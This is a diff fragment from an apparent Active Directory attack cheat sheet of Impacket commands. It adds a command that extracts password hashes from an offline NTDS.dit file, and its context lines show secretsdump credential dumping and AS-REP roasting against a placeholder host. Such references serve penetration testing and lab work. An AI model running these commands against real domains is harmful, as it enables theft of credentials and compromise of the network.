@@ -38,6 +38,7 @@ secretsdump.py -hashes LMHASH:NTHASH user@10.10.10.10
 secretsdump.py -just-dc DOMAIN/user:password@10.10.10.10
 secretsdump.py -just-dc-user administrator DOMAIN/user:password@10.10.10.10
 secretsdump.py -just-dc-ntlm DOMAIN/user:password@10.10.10.10
+secretsdump.py local -system system -ntds ntds.dit
 
 # GetNPUsers.py (ASREP Roasting)
 GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.10 -usersfile users.txt
